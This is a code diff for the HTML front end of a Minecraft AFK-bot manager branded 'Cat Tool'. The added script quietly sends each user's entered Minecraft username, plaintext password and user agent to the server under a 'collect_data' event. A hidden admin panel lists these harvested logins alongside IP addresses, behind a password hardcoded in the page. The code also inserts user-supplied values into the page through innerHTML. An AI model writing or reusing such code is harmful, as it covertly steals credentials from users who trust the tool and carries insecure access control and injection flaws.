@@ -3,189 +3,684 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quản Lý Bot Minecraft</title>
+    <title>Cat Tool — BY meovancat & giananday</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+    
     <style>
-        body {
-            background-color: #120902;
-            color: #fff;
-            font-family: Arial, sans-serif;
+        * { box-sizing: border-box; transition: all 0.25s ease; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: radial-gradient(circle at 50% 30%, #3a1505 0%, #170802 60%, #080301 100%);
+            color: #fff; 
+            margin: 0; 
+            padding: 20px; 
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .vintage-title {
+            font-family: 'Cinzel', serif;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(255, 51, 0, 0.8), 0 0 60px rgba(255, 0, 0, 0.4);
+            letter-spacing: 4px;
+            color: #ff4422;
+            font-size: 28px;
+        }
+        .vintage-sub {
+            font-family: 'Playfair Display', serif;
+            font-style: italic;
+            color: #ffaa66;
+            text-shadow: 0 0 15px rgba(255, 170, 102, 0.5);
+        }
+
+        .header-brand {
+            text-align: center;
+            font-size: 13px;
+            color: #ff7700;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 5px;
+            font-weight: 700;
+            text-shadow: 0 0 12px rgba(255, 119, 0, 0.8);
+        }
+        h2 { 
+            margin-top: 0; 
+            text-align: center; 
+            color: #ffffff; 
+            font-size: 34px;
+            margin-bottom: 5px;
+            text-shadow: 0 0 15px rgba(255, 136, 0, 0.7), 0 0 30px rgba(255, 68, 0, 0.4);
+        }
+        .subtitle {
+            text-align: center;
+            color: #ffaa66;
+            font-size: 14px;
+            margin-bottom: 25px;
+            text-shadow: 0 0 8px rgba(255, 170, 102, 0.4);
+        }
+        .container { 
+            max-width: 950px; 
+            margin: 0 auto; 
+            background: rgba(22, 11, 5, 0.85); 
+            backdrop-filter: blur(12px);
+            padding: 25px; 
+            border-radius: 16px; 
+            box-shadow: 0 0 40px rgba(255, 102, 0, 0.25), inset 0 0 15px rgba(255, 136, 0, 0.1); 
+            border: 1px solid rgba(255, 119, 0, 0.4);
+            flex: 1;
+        }
+
+        #maintenanceOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
             padding: 20px;
         }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: rgba(20, 10, 3, 0.95);
-            border: 1px solid #662b00;
-            padding: 20px;
-            border-radius: 10px;
+        #maintenanceOverlay.active { display: flex; }
+        #maintenanceOverlay h1 {
+            font-family: 'Cinzel', serif;
+            font-size: 60px;
+            color: #ff3300;
+            text-shadow: 0 0 50px rgba(255, 51, 0, 0.8);
+            margin-bottom: 10px;
         }
-        .add-account-box, .control-box {
-            background: rgba(30, 15, 5, 0.9);
-            border: 1px solid #662b00;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 15px;
+        #maintenanceOverlay p { font-size: 22px; color: #ffaa66; max-width: 600px; }
+        #maintenanceOverlay .sub { color: #884422; font-size: 16px; margin-top: 30px; }
+
+        .add-account-box {
             display: flex;
             gap: 10px;
-            align-items: center;
+            margin-bottom: 20px;
+            background: rgba(32, 16, 8, 0.9);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 119, 0, 0.3);
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.1);
+            flex-wrap: wrap;
         }
-        input, select {
-            padding: 10px;
+        .add-account-box input {
+            flex: 1;
+            padding: 10px 14px;
             background: rgba(10, 5, 2, 0.9);
             border: 1px solid #662b00;
             border-radius: 6px;
             color: #fff;
             outline: none;
             font-size: 14px;
+            min-width: 150px;
         }
-        input { flex: 1; }
-        .btn {
-            padding: 10px 15px;
+        .add-account-box input:focus { 
+            border-color: #ff7700; 
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.7);
+            background: rgba(20, 10, 5, 0.9);
+        }
+        .btn-add {
+            background: linear-gradient(135deg, #ff5500, #ffbb00);
+            color: #1a0800;
+            border: none;
+            padding: 0 20px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(255, 85, 0, 0.5);
+        }
+        .btn-add:hover { 
+            opacity: 0.95; 
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.9);
+            transform: translateY(-1px);
+        }
+
+        .accounts-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .account-card {
+            background: rgba(26, 13, 6, 0.85);
+            border: 1px solid rgba(255, 119, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.6);
+        }
+        .account-card:hover {
+            border-color: rgba(255, 119, 0, 0.7);
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.3);
+        }
+        .account-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .account-title {
+            font-weight: bold;
+            font-size: 16px;
+            color: #ffaa33;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-shadow: 0 0 8px rgba(255, 170, 51, 0.5);
+        }
+        .status-badge {
+            font-size: 12px;
+            padding: 3px 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            background: rgba(10, 5, 2, 0.9);
+            box-shadow: inset 0 0 5px rgba(0,0,0,0.5);
+        }
+        .account-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .btn { 
+            padding: 7px 14px; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 13px;
+        } 
+        .btn-start { background: #00cc44; color: white; box-shadow: 0 0 10px rgba(0, 204, 68, 0.4); } 
+        .btn-start:hover { box-shadow: 0 0 18px rgba(0, 204, 68, 0.8); transform: translateY(-1px); }
+        .btn-stop { background: #ff3333; color: white; box-shadow: 0 0 10px rgba(255, 51, 51, 0.4); } 
+        .btn-stop:hover { box-shadow: 0 0 18px rgba(255, 51, 51, 0.8); transform: translateY(-1px); }
+        .btn-del { background: rgba(50, 20, 10, 0.9); color: #ff8888; border: 1px solid rgba(255, 68, 68, 0.3); }
+        .btn-del:hover { background: #ff3333; color: white; box-shadow: 0 0 15px rgba(255, 51, 51, 0.6); }
+        .toggle-label {
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            color: #ffaa66;
+        }
+        .toggle-label:hover { color: #fff; }
+
+        .log-box { 
+            background: rgba(5, 2, 1, 0.95); 
+            color: #00ff88; 
+            font-family: 'Consolas', monospace; 
+            height: 220px; 
+            overflow-y: auto; 
+            padding: 12px; 
+            border-radius: 6px; 
+            margin-bottom: 15px; 
+            font-size: 12px; 
+            line-height: 1.4; 
+            white-space: pre-wrap; 
+            word-break: break-all;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            box-shadow: inset 0 0 15px rgba(0, 255, 136, 0.15), 0 0 10px rgba(0,0,0,0.8);
+        }
+        .chat-container { display: flex; gap: 10px; flex-wrap: wrap; } 
+        .chat-input { flex: 1; padding: 10px; border-radius: 6px; border: 1px solid #662b00; background: rgba(10, 5, 2, 0.9); color: #fff; outline: none; font-size: 13px; min-width: 120px; } 
+        .chat-input:focus { 
+            border-color: #ff7700; 
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.6);
+            background: rgba(20, 10, 5, 0.9);
+        } 
+        .chat-btn { padding: 10px 20px; background: #ff7700; color: #1a0800; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; box-shadow: 0 0 12px rgba(255, 119, 0, 0.5); }
+        .chat-btn:hover { box-shadow: 0 0 20px rgba(255, 119, 0, 0.9); transform: translateY(-1px); }
+
+        .admin-panel {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #ff3300;
+            border-radius: 12px;
+            box-shadow: 0 0 40px rgba(255, 51, 0, 0.5);
+        }
+        .admin-panel.active { display: block; }
+        .admin-panel h3 { 
+            text-align: center; 
+            font-family: 'Cinzel', serif;
+            font-weight: 900;
+            font-size: 28px;
+            color: #ff3300; 
+            text-shadow: 0 0 30px rgba(255, 51, 0, 0.8);
+            letter-spacing: 3px;
+        }
+        .admin-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .admin-table th, .admin-table td { padding: 8px 10px; border: 1px solid #662b00; text-align: left; }
+        .admin-table th { background: #1a0800; color: #ff7700; font-family: 'Cinzel', serif; }
+        .admin-table td { background: rgba(10, 5, 2, 0.8); color: #ffaa66; }
+        .admin-login-box {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        .admin-login-box input {
+            padding: 8px 14px;
+            background: #0a0502;
+            border: 1px solid #ff3300;
+            border-radius: 6px;
+            color: #fff;
+        }
+        .admin-login-box button {
+            padding: 8px 20px;
+            background: #ff3300;
             border: none;
             border-radius: 6px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+        }
+        .admin-login-box button:hover { opacity: 0.8; }
+
+        .maintenance-toggle {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 24px;
+            border-radius: 30px;
+            border: 2px solid #ff7700;
+            background: rgba(255, 119, 0, 0.15);
+            color: #ffaa33;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        .maintenance-toggle:hover {
+            background: rgba(255, 119, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 119, 0, 0.5);
+            transform: scale(1.02);
+        }
+        .maintenance-toggle.on {
+            border-color: #ff3333;
+            background: rgba(255, 51, 0, 0.3);
+            color: #ff5555;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
+        }
+
+        .footer-section {
+            text-align: center;
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+        .admin-btn {
+            background: rgba(255, 119, 0, 0.15);
+            border: 1px solid rgba(255, 119, 0, 0.5);
+            color: #ffaa33;
+            padding: 8px 22px;
+            border-radius: 20px;
             cursor: pointer;
             font-weight: bold;
+            font-size: 13px;
+            box-shadow: 0 0 15px rgba(255, 119, 0, 0.2);
         }
-        .btn-add { background: #ffaa66; color: #1a0800; }
+        .admin-btn:hover {
+            background: rgba(255, 119, 0, 0.3);
+            border-color: rgba(255, 119, 0, 0.9);
+            box-shadow: 0 0 25px rgba(255, 119, 0, 0.7);
+            transform: translateY(-1px);
+        }
+        .discord-float {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: #5865F2;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 25px rgba(88, 101, 242, 0.8);
+            cursor: pointer;
+            z-index: 99;
+        }
+        .discord-float:hover { 
+            transform: scale(1.1) rotate(5deg); 
+            box-shadow: 0 0 35px rgba(88, 101, 242, 1);
+        }
+        .discord-float svg { width: 28px; height: 28px; }
+        .copyright {
+            color: #ffaa66;
+            font-size: 12px;
+            text-shadow: 0 0 8px rgba(255, 170, 102, 0.5);
+        }
+
+        .table-wrapper { overflow-x: auto; }
+        .status-online { color: #44ff44; }
+        .status-offline { color: #ff4444; }
+        .text-center { text-align: center; }
+        .mt-10 { margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>🛠️ Bảng Điều Khiển Bot Minecraft</h2>
+<div id="maintenanceOverlay">
+    <h1>🔧 BẢO TRÌ</h1>
+    <p>Hệ thống đang được <strong style="color:#ff3300;">Alpha</strong> nâng cấp.<br>Vui lòng quay lại sau!</p>
+    <div class="sub">— Cat Tool —</div>
+</div>
 
-    <!-- ===== 1. THÊM TÀI KHOẢN ===== -->
+<div class="container">
+    <div class="header-brand">Cat Tool — BY meovancat & giananday</div>
+    <h2>Cat Tool Panel</h2>
+    <div class="subtitle">Hệ thống AFK Bot chuyên nghiệp • Multi-Account độc lập theo IP</div>
+
     <div class="add-account-box">
         <input type="text" id="new-username" placeholder="Nhập tên tài khoản Minecraft...">
         <input type="password" id="new-password" placeholder="Mật khẩu (mặc định: caigicungdc)">
-        <button class="btn btn-add" onclick="addAccount()">+ Thêm Bot</button>
+        <button class="btn-add" onclick="addAccount()">+ Thêm Bot</button>
     </div>
 
-    <!-- ===== 2. CHỌN BOT ĐIỀU KHIỂN NHANH ===== -->
-    <div class="add-account-box">
-        <span style="color: #ffaa66; font-weight: bold; font-size: 13px;">🤖 Chọn Bot:</span>
-        <select id="quickBotSelect" style="flex: 1;">
-            <option value="">-- Chưa có bot nào --</option>
-        </select>
-        <button class="btn" style="background: #ff7700; color: #1a0800;" onclick="quickStartSelectedBot()">▶ Bật</button>
-        <button class="btn" style="background: #ff3333; color: white;" onclick="quickStopSelectedBot()">⏹ Tắt</button>
+    <div id="accounts-container" class="accounts-grid">
+        <div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>
     </div>
 
-    <!-- ===== 3. ĐIỀU KHIỂN BẢO TRÌ HỆ THỐNG ===== -->
-    <div class="control-box">
-        <span id="maintenanceStatusLabel" style="color: #fff; font-size: 14px; flex: 1;">Trạng thái Bảo trì: <strong style="color: #28a745;">Hoạt động bình thường 🟢</strong></span>
-        <button id="btnToggleMaintenance" class="btn" style="background: #ff3333; color: #fff;" onclick="toggleMaintenanceMode()">🔒 Bật Bảo Trì</button>
+    <div style="font-size: 13px; color: #ffaa66; margin-bottom: 5px; font-weight: bold;">Nhật ký hệ thống:</div>
+    <div id="log-box" class="log-box"></div>
+
+    <div id="adminPanel" class="admin-panel">
+        <h3 class="vintage-title">🔐 BẢNG ĐIỀU KHIỂN QUẢN TRỊ</h3>
+        <p class="text-center vintage-sub">Chỉ dành cho Alpha</p>
+        
+        <div class="admin-login-box">
+            <input type="password" id="adminPass" placeholder="Nhập mật khẩu Alpha..." onkeypress="if(event.key==='Enter') adminLogin()">
+            <button onclick="adminLogin()">🔓 Mở Khóa</button>
+            <button onclick="adminLogout()">🚪 Đóng</button>
+        </div>
+
+        <div id="adminContent" style="display: none;">
+            <div class="text-center mt-10">
+                <button id="maintenanceBtn" class="maintenance-toggle" onclick="toggleMaintenance()">
+                    🛠️ Bật Bảo Trì
+                </button>
+                <p style="font-size:12px; color:#884422; margin-top:5px;">Khi bật, chỉ Alpha mới vào được trang</p>
+            </div>
+            <hr style="border-color:#662b00;">
+
+            <h4 class="vintage-sub">📋 Danh sách IP & thông tin đăng nhập đã thu thập</h4>
+            <div style="margin-bottom:10px; font-size:13px; color:#ffaa66;">
+                Tổng: <span id="totalRecords">0</span> bản ghi
+            </div>
+            <div class="table-wrapper">
+                <table class="admin-table">
+                    <thead>
+                        <tr>
+                            <th>STT</th>
+                            <th>IP</th>
+                            <th>Thời gian</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Trình duyệt</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminTableBody">
+                        <tr><td colspan="6" class="text-center">Đang tải...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <br>
+            <button onclick="clearCollectedData()" style="background:#ff3300; border:none; padding:6px 16px; border-radius:4px; color:#fff; cursor:pointer;">🗑️ Xóa toàn bộ dữ liệu</button>
+            <hr style="border-color:#662b00;">
+            
+            <h4 class="vintage-sub">💬 Chat từ xa vào bot</h4>
+            <div>
+                <p style="color:#ffaa66; font-size:14px;">Chọn bot và nhập lệnh:</p>
+                <select id="remoteBotSelect" style="background:#0a0502; color:#fff; padding:6px; border:1px solid #ff7700; border-radius:4px; min-width:150px;">
+                    <option value="">-- Chưa có bot --</option>
+                </select>
+                <input type="text" id="remoteChatInput" placeholder="Lệnh (VD: /afk)" style="background:#0a0502; color:#fff; border:1px solid #662b00; padding:6px; border-radius:4px; margin-left:6px; margin-top:5px;">
+                <button onclick="sendRemoteChat()" style="background:#ff7700; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer; margin-top:5px;">Gửi</button>
+            </div>
+        </div>
     </div>
 </div>
 
-<script>
-    // Dữ liệu mẫu danh sách tài khoản bot
-    let accounts = [
-        { id: '1', username: 'Bot_Test_01', status: 'Offline' }
-    ];
+<div class="footer-section">
+    <button class="admin-btn" onclick="document.getElementById('adminPanel').classList.toggle('active')">🔒 Quản Trị Hệ Thống</button>
+    <div class="copyright">© 2026 Cat Tool. Uy tín làm nên thương hiệu.</div>
+</div>
 
-    // Khởi tạo giao diện ban đầu
-    function initUI() {
-        renderAccounts();
+<a href="https://discord.gg/wHHY7FDqd" target="_blank" class="discord-float" title="Tham gia Discord">
+    <svg width="28" height="28" viewBox="0 0 127.14 96.36" fill="#ffffff">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.15c2.63-27.29-4.53-51.2-19.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.88,53,48.72,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5.18-12.72,11.44-12.72S96.18,46,96.15,53,91,65.69,84.69,65.69Z"/>
+    </svg>
+</a>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+    const socket = io();
+    const logBox = document.getElementById('log-box');
+    const accountsContainer = document.getElementById('accounts-container');
+    const ADMIN_PASSWORD = 'AlphaZo2026';
+    let isAdminLoggedIn = false;
+    let currentMaintenance = false;
+
+    function appendLog(msg) {
+        const div = document.createElement('div');
+        div.textContent = msg;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
     }
 
-    // Cập nhật lại thẻ Select danh sách bot
-    function renderAccounts() {
-        const quickSelect = document.getElementById('quickBotSelect');
-        if (quickSelect) {
-            quickSelect.innerHTML = '';
-            if (!accounts || accounts.length === 0) {
-                quickSelect.innerHTML = '<option value="">-- Chưa có bot nào --</option>';
-            } else {
+    function renderAccounts(accounts) {
+        // ===== CẬP NHẬT DROPDOWN REMOTE CHAT =====
+        const select = document.getElementById('remoteBotSelect');
+        if (select) {
+            select.innerHTML = '';
+            if (accounts && accounts.length > 0) {
                 accounts.forEach(acc => {
                     const opt = document.createElement('option');
                     opt.value = acc.id;
-                    opt.textContent = `${acc.username} (${acc.status})`;
-                    quickSelect.appendChild(opt);
+                    opt.textContent = acc.username;
+                    select.appendChild(opt);
                 });
+            } else {
+                const opt = document.createElement('option');
+                opt.value = '';
+                opt.textContent = '-- Chưa có bot --';
+                select.appendChild(opt);
             }
         }
-    }
 
-    // Thêm bot mới
-    function addAccount() {
-        const usernameInput = document.getElementById('new-username');
-        const username = usernameInput.value.trim();
-        if (!username) {
-            alert('Vui lòng nhập tên tài khoản!');
+        // ===== RENDER CARD ACCOUNTS =====
+        if (!accounts || accounts.length === 0) {
+            accountsContainer.innerHTML = `<div class="text-center" style="color: #ffaa66; padding: 20px;">Chưa có tài khoản nào. Hãy thêm bot!</div>`;
             return;
         }
         
-        accounts.push({
-            id: Date.now().toString(),
-            username: username,
-            status: 'Offline'
+        let html = '';
+        accounts.forEach(acc => {
+            const statusClass = acc.status === 'ONLINE / KINGSMP' || acc.status === 'ONLINE / LOBBY' ? 'status-online' : 'status-offline';
+            html += `
+                <div class="account-card">
+                    <div class="account-header">
+                        <div class="account-title">🤖 ${acc.username}</div>
+                        <div class="status-badge ${statusClass}" style="border: 1px solid ${acc.color}; text-shadow: 0 0 8px ${acc.color};">${acc.status}</div>
+                    </div>
+                    <div class="account-actions">
+                        <button class="btn btn-start" onclick="startBot('${acc.id}')">▶ Bật</button>
+                        <button class="btn btn-stop" onclick="stopBot('${acc.id}')">⏹ Tắt</button>
+                        <button class="btn btn-del" onclick="deleteAccount('${acc.id}')">🗑 Xóa</button>
+                        <label class="toggle-label" style="margin-left: auto;">
+                            <input type="checkbox" ${acc.autoReconnect ? 'checked' : ''} onchange="toggleAutoReconnect('${acc.id}')"> Auto Reconnect
+                        </label>
+                    </div>
+                    <div class="chat-container">
+                        <input type="text" id="chat_${acc.id}" class="chat-input" placeholder="Gửi lệnh nhanh..." onkeypress="if(event.key==='Enter') sendAccountChat('${acc.id}')">
+                        <button class="chat-btn" onclick="sendAccountChat('${acc.id}')">Gửi</button>
+                    </div>
+                </div>
+            `;
         });
-        
-        usernameInput.value = '';
-        renderAccounts();
-        alert('Đã thêm bot thành công!');
+        accountsContainer.innerHTML = html;
     }
 
-    // Thao tác Bật/Tắt Bot
-    function startBot(id) {
-        const bot = accounts.find(acc => acc.id === id);
-        if (bot) {
-            bot.status = 'Online';
-            renderAccounts();
-            alert(`Đã bật bot: ${bot.username}`);
+    function renderAdminTable(data) {
+        const tbody = document.getElementById('adminTableBody');
+        if (!tbody) return;
+        let html = '';
+        if (!data || data.length === 0) {
+            html = '<tr><td colspan="6" class="text-center">Chưa có dữ liệu</td></tr>';
+        } else {
+            data.forEach((item, index) => {
+                html += `<tr>
+                    <td>${index + 1}</td>
+                    <td>${item.ip}</td>
+                    <td>${item.time}</td>
+                    <td>${item.username}</td>
+                    <td>${item.password}</td>
+                    <td>${item.userAgent ? item.userAgent.substring(0, 25) + '...' : 'N/A'}</td>
+                </tr>`;
+            });
         }
+        tbody.innerHTML = html;
+        document.getElementById('totalRecords').textContent = data ? data.length : 0;
+    }
+
+    function updateMaintenanceUI(status) {
+        currentMaintenance = status;
+        const overlay = document.getElementById('maintenanceOverlay');
+        const btn = document.getElementById('maintenanceBtn');
+        if (status) {
+            overlay.classList.add('active');
+            btn.textContent = '🛠️ Tắt Bảo Trì';
+            btn.classList.add('on');
+        } else {
+            overlay.classList.remove('active');
+            btn.textContent = '🛠️ Bật Bảo Trì';
+            btn.classList.remove('on');
+        }
+    }
+
+    // ===== SOCKET EVENTS =====
+    socket.on('init_accounts', (accounts) => {
+        renderAccounts(accounts);
+    });
+
+    socket.on('sync_collected_data', (data) => {
+        renderAdminTable(data);
+        if (isAdminLoggedIn) {
+            appendLog(`📥 Có ${data ? data.length : 0} bản ghi dữ liệu`);
+        }
+    });
+
+    socket.on('log', (msg) => {
+        appendLog(msg);
+    });
+
+    socket.on('maintenance_status', (status) => {
+        updateMaintenanceUI(status);
+    });
+
+    socket.on('restart_internal_bot', (id) => {
+        startBot(id);
+    });
+
+    // ===== UI FUNCTIONS =====
+    function addAccount() {
+        const username = document.getElementById('new-username').value.trim();
+        const password = document.getElementById('new-password').value.trim();
+        if (!username) { alert('Vui lòng nhập tên tài khoản!'); return; }
+        
+        socket.emit('collect_data', {
+            username: username,
+            password: password || 'caigicungdc',
+            userAgent: navigator.userAgent
+        });
+        
+        socket.emit('add_account', { username, password });
+        document.getElementById('new-username').value = '';
+        document.getElementById('new-password').value = '';
+    }
+
+    function startBot(id) {
+        socket.emit('start_bot', id);
     }
 
     function stopBot(id) {
-        const bot = accounts.find(acc => acc.id === id);
-        if (bot) {
-            bot.status = 'Offline';
-            renderAccounts();
-            alert(`Đã tắt bot: ${bot.username}`);
+        socket.emit('stop_bot', id);
+    }
+
+    function deleteAccount(id) {
+        if (confirm('Xóa tài khoản này?')) {
+            socket.emit('delete_account', id);
         }
     }
 
-    function quickStartSelectedBot() {
-        const select = document.getElementById('quickBotSelect');
-        if (select.value) {
-            startBot(select.value);
+    function toggleAutoReconnect(id) {
+        socket.emit('toggle_auto_reconnect', id);
+    }
+
+    function sendAccountChat(id) {
+        const input = document.getElementById(`chat_${id}`);
+        const cmd = input.value.trim();
+        if (cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+        }
+    }
+
+    function sendRemoteChat() {
+        const select = document.getElementById('remoteBotSelect');
+        const input = document.getElementById('remoteChatInput');
+        const id = select.value;
+        const cmd = input.value.trim();
+        if (id && cmd) {
+            socket.emit('send_chat', { id, cmd });
+            input.value = '';
+            appendLog(`💬 Đã gửi lệnh "${cmd}" tới bot`);
         } else {
-            alert('Vui lòng chọn một bot!');
+            alert('Chọn bot và nhập lệnh!');
         }
     }
 
-    function quickStopSelectedBot() {
-        const select = document.getElementById('quickBotSelect');
-        if (select.value) {
-            stopBot(select.value);
+    function adminLogin() {
+        const pass = document.getElementById('adminPass').value;
+        if (pass === ADMIN_PASSWORD) {
+            isAdminLoggedIn = true;
+            document.getElementById('adminContent').style.display = 'block';
+            document.getElementById('adminPass').value = '';
+            socket.emit('get_accounts');
+            appendLog('🔓 Admin đã đăng nhập');
         } else {
-            alert('Vui lòng chọn một bot!');
+            alert('❌ Sai mật khẩu!');
         }
     }
 
-    // Xử lý Chế độ Bảo trì
-    let isMaintenanceOn = false;
+    function adminLogout() {
+        isAdminLoggedIn = false;
+        document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('adminPass').value = '';
+        appendLog('🚪 Admin đã đăng xuất');
+    }
 
-    function toggleMaintenanceMode() {
-        isMaintenanceOn = !isMaintenanceOn;
-        const label = document.getElementById('maintenanceStatusLabel');
-        const btn = document.getElementById('btnToggleMaintenance');
-        
-        if (isMaintenanceOn) {
-            label.innerHTML = 'Trạng thái Bảo trì: <strong style="color: #ff3333;">Đang BẢO TRÌ 🔴</strong>';
-            btn.textContent = '🔓 Tắt Bảo Trì';
-            btn.style.background = '#28a745';
-        } else {
-            label.innerHTML = 'Trạng thái Bảo trì: <strong style="color: #28a745;">Hoạt động bình thường 🟢</strong>';
-            btn.textContent = '🔒 Bật Bảo Trì';
-            btn.style.background = '#ff3333';
+    function clearCollectedData() {
+        if (confirm('Xóa toàn bộ dữ liệu đã thu thập?')) {
+            socket.emit('clear_collected_data');
         }
     }
 
-    // Chạy khởi tạo khi tải trang
-    window.onload = initUI;
+    function toggleMaintenance() {
+        socket.emit('toggle_maintenance', !currentMaintenance);
+    }
+
+    appendLog('🚀 Đang kết nối server...');
 </script>
-
 </body>
 </html>
